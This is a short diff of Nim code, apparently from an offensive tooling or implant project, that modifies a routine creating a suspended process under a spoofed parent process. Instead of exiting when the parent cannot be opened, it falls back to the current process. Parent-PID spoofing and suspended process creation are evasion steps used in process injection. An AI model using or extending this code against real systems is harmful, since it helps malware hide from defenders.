@@ -88,8 +88,8 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
         var parentProcessId = getPid(parentProcessName)
         var parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentProcessId)
         if parentProcessHandle == 0:
-            when not defined(release): echo "[-] Could not get handle to spoofed parent process"
-            quit()
+            when not defined(release): echo "[-] Could not get handle to spoofed parent process. using current process as parent"
+            parentProcessHandle = GetCurrentProcess()
         if UpdateProcThreadAttribute(
             si.lpAttributeList,
             0,
@@ -118,7 +118,6 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
     ) != TRUE:
         when not defined(release): echo "[-] Could not create process"
         quit()
-
 
     # Return updated process information
     return addr pi
